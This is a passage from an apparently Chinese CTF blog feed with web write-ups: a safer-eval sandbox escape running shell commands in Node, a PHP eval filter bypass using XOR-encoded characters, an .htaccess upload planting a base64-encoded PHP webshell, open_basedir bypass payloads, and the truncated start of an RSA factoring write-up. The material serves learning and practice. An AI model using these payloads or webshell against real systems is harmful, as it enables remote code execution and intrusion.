class="line">  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h3 id="2-源代码"><a href="#2-源代码" class="headerlink" title="2.源代码"></a>2.源代码</h3><p>这是第二个提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const bodyParser = require(&#x27;body-parser&#x27;);</span><br><span class="line"></span><br><span class="line">const saferEval = require(&#x27;safer-eval&#x27;); // 2019.7/WORKER1 找到一个很棒的库</span><br><span class="line"></span><br><span class="line">const fs = require(&#x27;fs&#x27;);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; extended: false &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">// 2020.1/WORKER2 老板说为了后期方便优化</span><br><span class="line">app.use((req, res, next) =&gt; &#123;</span><br><span class="line">  if (req.path === &#x27;/eval&#x27;) &#123;</span><br><span class="line">    let delay = 60 * 1000;</span><br><span class="line">    console.log(delay);</span><br><span class="line">    if (Number.isInteger(parseInt(req.query.delay))) &#123;</span><br><span class="line">      delay = Math.max(delay, parseInt(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    const t = setTimeout(() =&gt; next(), delay);</span><br><span class="line">    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      console.log(&#x27;timeout&#x27;);</span><br><span class="line">      try &#123;</span><br><span class="line">        res.send(&#x27;Timeout!&#x27;);</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/eval&#x27;, function (req, res) &#123;</span><br><span class="line">  let response = &#x27;&#x27;;</span><br><span class="line">  if (req.body.e) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      response = saferEval(req.body.e);                                     //在这里沙箱逃逸，故需要以POST方式提交e</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">      response = &#x27;Wrong Wrong Wrong!!!!&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(String(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span><br><span class="line">app.get(&#x27;/source&#x27;, function (req, res) &#123;</span><br><span class="line">  res.set(&#x27;Content-Type&#x27;, &#x27;text/javascript;charset=utf-8&#x27;);</span><br><span class="line">  res.send(fs.readFileSync(&#x27;./index.js&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span><br><span class="line">app.get(&#x27;/version&#x27;, function (req, res) &#123;</span><br><span class="line">  res.set(&#x27;Content-Type&#x27;, &#x27;text/json;charset=utf-8&#x27;);</span><br><span class="line">  res.send(fs.readFileSync(&#x27;./package.json&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, function (req, res) &#123;</span><br><span class="line">  res.set(&#x27;Content-Type&#x27;, &#x27;text/html;charset=utf-8&#x27;);</span><br><span class="line">  res.send(fs.readFileSync(&#x27;./index.html&#x27;))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123;</span><br><span class="line">  console.log(&#x27;Start listening&#x27;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面是js代码，状况感觉就发生在<img src="/2020/10/27/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzNode//1.png">这里。</p><h2 id="2-setTimeout-函数int溢出"><a href="#2-setTimeout-函数int溢出" class="headerlink" title="2.setTimeout()函数int溢出"></a>2.setTimeout()函数int溢出</h2><p>想进行我们邪恶的<code>/eval</code>，还得绕过一个超时判定，即下面的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (req.path === &#x27;/eval&#x27;) &#123;</span><br><span class="line">    ... //此处省略</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对于<code>query</code>(GET)到的参数<code>delay</code>与原先的delay做了一个取最大值的操作，原先的<code>delay=60 * 1000</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (Number.isInteger(parseInt(req.query.delay))) &#123;</span><br><span class="line">      delay = Math.max(delay, parseInt(req.query.delay));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是这里的下面的一个函数存在漏洞，故而可以绕过这个<code>Timeout</code>继续向下执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const t = setTimeout(() =&gt; next(), delay);</span><br><span class="line">    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      console.log(&#x27;timeout&#x27;);</span><br><span class="line">      try &#123;</span><br><span class="line">        res.send(&#x27;Timeout!&#x27;);</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, 1000);</span><br></pre></td></tr></table></figure><p>限制时间不超过1000，单位应该是<code>1000ms</code>吧!所以用下面的知识绕过</p><blockquote><p>就是我们传入的delay如果二进制大小超过32位（2147483647即<code>2^31-1</code>，&lt;因为有符号位&gt;），会被settimeout设为1，这样就满足条件了</p></blockquote><h2 id="3-payload"><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h2><p>所以我们可以得出以下的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#GET</span><br><span class="line">/eval?delay=2147483648</span><br><span class="line"></span><br><span class="line">#POST</span><br><span class="line">e=(function () &#123;</span><br><span class="line">  const process = clearImmediate.constructor(&quot;return process;&quot;)();</span><br><span class="line">  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p><img src="/2020/10/27/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzNode//2.png"></p><h2 id="4-flag"><a href="#4-flag" class="headerlink" title="4.flag"></a>4.flag</h2><p>将POST内容改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e=(function () &#123;</span><br><span class="line">  const process = clearImmediate.constructor(&quot;return process;&quot;)();</span><br><span class="line">  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString()</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>即可获得flag</p><p><img src="/2020/10/27/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzNode//3.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;16bb2fd5-c976-4cbb-ad1f-5cb598c1c3ec&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019-EasyWeb</title>
      <link href="/2020/10/26/SUCTF2019-EasyWeb/"/>
      <url>/2020/10/26/SUCTF2019-EasyWeb/</url>
      
        <content type="html"><![CDATA[<h2 id="1-源码"><a href="#1-源码" class="headerlink" title="1.源码"></a>1.源码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">function get_the_flag()&#123;</span><br><span class="line">    // webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;);</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path= $userdir.&quot;/&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[&#x27;_&#x27;];</span><br><span class="line"></span><br><span class="line">if (!$hhh)&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($hhh)&gt;18)&#123;</span><br><span class="line">    die(&#x27;One inch long, one inch strong!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( preg_match(&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;, $hhh) )</span><br><span class="line">    die(&#x27;Try something else!&#x27;);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, 3);</span><br><span class="line">if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</span><br><span class="line"></span><br><span class="line">eval($hhh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先看下面的代码执行RCE。<code>eval($hhh);</code>。</p><h2 id="2-php不可见字符绕过preg-match-函数rce"><a href="#2-php不可见字符绕过preg-match-函数rce" class="headerlink" title="2.php不可见字符绕过preg_match()函数rce"></a>2.php不可见字符绕过preg_match()函数rce</h2><p>首先有<code>eval()</code>函数，就先想着绕过前面的各种限制（就是字符串的长度小于或等于18个），这个看大佬的wp说可以用什么不可见字符异或得我们想要的字符来绕过，下面是大佬的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;T&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = <span class="built_in">chr</span>(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s:%s^%s&quot;</span>%(result,a,b))</span><br></pre></td></tr></table></figure><p><img src="/2020/10/26/SUCTF2019-EasyWeb//1.png"></p><p>可见</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_:%FF^%A0</span><br><span class="line">G:%FF^%B8</span><br><span class="line">E:%FF^%BA</span><br><span class="line">T:%FF^%AB</span><br></pre></td></tr></table></figure><p>可用的payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"></span><br><span class="line">她所代表的真正的含义为</span><br><span class="line">`$_GET&#123;x&#125;()`</span><br></pre></td></tr></table></figure><p>后面就能通过上传参数<code>x=phpinfo</code>构造<code>phpinfo();</code>了。（ztmnb）<br><img src="/2020/10/26/SUCTF2019-EasyWeb//2.png"></p><p>然后把<code>phpinfo</code>换为<code>get_the_flag()</code>函数就能执行这个上传的功能了。（好像是因为设置了什么open_basedir限制了eval的功能，所以得传个webshell才可）</p><h2 id="3-上传webshell"><a href="#3-上传webshell" class="headerlink" title="3.上传webshell"></a>3.上传webshell</h2><p>上传部分源码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function get_the_flag()&#123;</span><br><span class="line">    // webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);   #对ph开头的后缀名做了限制</span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;);  #对`&lt;?`做了限制</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path= $userdir.&quot;/&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-上传文件"><a href="#1-上传文件" class="headerlink" title="1.上传文件"></a>1.上传文件</h3><p>大佬的经验<code>.htaccess上传的时候不能用GIF89a等文件头去绕过exif_imagetype,因为这样虽然能上传成功，但.htaccess文件无法生效。</code><br>可以用以下两种方法开头以绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">可以用</span><br><span class="line">&quot;\x00\x00\x8a\x39\x8a\x39&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">也可以用</span><br><span class="line">&quot;#define width 1337&quot;</span><br><span class="line">&quot;#define height 1337&quot;</span><br></pre></td></tr></table></figure><p>另外<code>因为这里的php是7.2的版本，无法使用 &lt;script language=&quot;php&quot;&gt;&lt;/script&gt; 来绕过对 &lt;? 的检测</code></p><p>这里的绕过对<code>&lt;?</code>的检测。可以使用<code>base64编码</code>进行绕过，然后再在apache的解析文件中将文件的内容还原从而绕过<br><img src="/2020/10/26/SUCTF2019-EasyWeb//3.png"></p><p>.htaccess文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x8a\x39\x8a\x39</span><br><span class="line">AddType application/x-httpd-php .abc</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_556cf09f27d80bd5b6cffc1d3f08a264/sh3ll.abc&quot;</span><br></pre></td></tr></table></figure><p>这里的<code>tmp_</code>后面的似乎是当前的ip地址md5加密后的结果，<del>浏览器输入ip，复制后加密取32位小写代换一下就ok啦。</del>好了这样不行，我好jb菜，得等下面的脚本运行成功后改为脚本打印出来的值就ok了。</p><p>sh3ll.abc文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12</span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsnMSddKTs/Pg==</span><br></pre></td></tr></table></figure><h3 id="2-上传文件的脚本"><a href="#2-上传文件的脚本" class="headerlink" title="2.上传文件的脚本"></a>2.上传文件的脚本</h3><p>借鉴一个上传文件的脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .abc</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_556cf09f27d80bd5b6cffc1d3f08a264/sh3ll.abc&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sh3ll = <span class="string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_REQUEST[&#x27;1&#x27;]);?&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://142537bb-b873-4a5a-900c-80c61dd2b53d.node3.buuoj.cn/?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;upload&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;sh3ll.abc&#x27;</span>,sh3ll,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">          <span class="comment">#文件:(&#x27;上传的文件名&#x27;,变量名,&#x27;文件类型&#x27;)</span></span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>文件上传成功<img src="/2020/10/26/SUCTF2019-EasyWeb//4.png"></p><h2 id="4-绕过disable-function之open-basedir"><a href="#4-绕过disable-function之open-basedir" class="headerlink" title="4.绕过disable_function之open_basedir:"></a>4.绕过disable_function之<code>open_basedir:</code></h2><p><a href="https://xz.aliyun.com/t/4720">先知上绕过open_basedir限制的解析</a><br>所以这个可以用下面的payload（文章内容没细看）<br>在<code>hackbar</code>里面测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure><p><img src="/2020/10/26/SUCTF2019-EasyWeb//5.png"><br>flag文件名为<code>THis_Is_tHe_F14g</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);echo(file_get_contents(&#x27;/THis_Is_tHe_F14g&#x27;));</span><br></pre></td></tr></table></figure><p><img src="/2020/10/26/SUCTF2019-EasyWeb//6.png"></p><h2 id="5-flag"><a href="#5-flag" class="headerlink" title="5.flag"></a>5.flag</h2><p><code>flag&#123;3f0c058d-ac5a-45a8-a1fd-8ab96b968630&#125;</code></p><blockquote><p>好TM累，睡觉！</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> php代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ_密码_RSA</title>
      <link href="/2020/10/25/BUUOJ%E9%83%A8%E5%88%86%E5%AF%86%E7%A0%81%E9%A2%98-%E4%B8%80%E8%88%ACRSA/"/>
      <url>/2020/10/25/BUUOJ%E9%83%A8%E5%88%86%E5%AF%86%E7%A0%81%E9%A2%98-%E4%B8%80%E8%88%ACRSA/</url>
      
        <content type="html"><![CDATA[<h2 id="用到的链接"><a href="#用到的链接" class="headerlink" title="用到的链接"></a>用到的链接</h2><p><a href="http://tool.chacuo.net/cryptrsakeyparse">RSA公钥解析</a><br><a href="https://tool.lu/hexconvert/">进制转换</a><br><a href="http://www.factordb.com/index.php?query=86934482296048119190666062003494800588905656017203025617216654058378322103517">RSA之p、q的提取</a><br><a href="https://blog.csdn.net/weixin_45369385/article/details/109208109">RSA-详解dp泄漏</a></p><h2 id="1-RSA"><a href="#1-RSA" class="headerlink" title="1.RSA"></a>1.RSA</h2><h3 id="1-提取n、e"><a href="#1-提取n、e" class="headerlink" title="1.提取n、e"></a>1.提取n、e</h3><p>flag.enc是加密后的文件，pub.enc是公钥文件。</p><p>附件下载下来以后首先看<code>pub.key</code>文件，打开后发现里面的内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+</span><br><span class="line">/AvKr1rzQczdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p><a href="http://tool.chacuo.net/cryptrsakeyparse">RSA公钥解析</a>分解一下得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">公钥指数及模数信息:</span><br><span class="line">key长度：256</span><br><span class="line">模数：C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD</span><br><span class="line">指数：65537 (0x10001)</span><br></pre></td></tr></table></figure><p>模数即为<code>n的值</code>，转换为10进制为<code>86934482296048119190666062003494800588905656017203025617216654058378322103517</code>，<br>指数即为<code>e的值</code>，为<code>65537</code>。</p><h3 id="2-提取p、q"><a href="#2-提取p、q" class="headerlink" title="2.提取p、q"></a>2.提取p、q</h3><p><a href="http://www.factordb.com/index.php?query=86934482296048119190666062003494800588905656017203025617216654058378322103517">RSA之p、q的提取</a><br>通过n提取出p、q的值分别为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p=285960468890451637935629440372639283459</span><br><span class="line">q=304008741604601924494328155975272418463</span><br></pre></td></tr></table></figure><h3 id="3-脚本解密"><a href="#3-脚本解密" class="headerlink" title="3.脚本解密"></a>3.脚本解密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span>                                            <span class="comment">#上面分别列出n、p、q的值</span></span><br><span class="line"></span><br><span class="line">phi = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)                                                                     <span class="comment">#计算出欧拉函数的值</span></span><br><span class="line">d = gmpy2.invert(e, phi)                                                              <span class="comment">#逆向求出d的值，需要指数e与欧拉函数值phi</span></span><br><span class="line"></span><br><span class="line">key = 